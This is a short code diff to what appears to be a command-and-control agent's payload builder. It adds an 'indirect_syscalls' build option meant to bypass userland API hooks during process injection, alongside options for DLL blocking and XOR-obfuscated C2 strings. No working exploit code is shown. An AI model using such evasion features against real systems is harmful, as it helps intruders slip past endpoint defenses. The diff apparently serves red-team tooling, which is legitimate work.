@@ -211,6 +211,13 @@ var payloadDefinition = agentstructs.PayloadType{
 			DefaultValue:  false,
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
 		},
+		{
+			Name:          "indirect_syscalls",
+			Description:   "Enable indirect syscalls at startup. Resolves Nt* syscall numbers from ntdll export table and generates stubs that jump to ntdll's syscall;ret gadget. Injection commands will use indirect syscalls to bypass userland API hooks. Windows only — no-op on Linux/macOS.",
+			Required:      false,
+			DefaultValue:  false,
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
+		},
 	},
 	BuildSteps: []agentstructs.BuildStep{
 		{
@@ -389,6 +396,9 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 	}
 	if blockDlls, err := payloadBuildMsg.BuildParameters.GetBooleanArg("block_dlls"); err == nil && blockDlls {
 		ldflags += fmt.Sprintf(" -X '%s.blockDLLs=true'", fawkes_main_package)
+	}
+	if indSyscalls, err := payloadBuildMsg.BuildParameters.GetBooleanArg("indirect_syscalls"); err == nil && indSyscalls {
+		ldflags += fmt.Sprintf(" -X '%s.indirectSyscalls=true'", fawkes_main_package)
 	}
 
 	// String obfuscation: XOR-encode C2 config strings with a random key
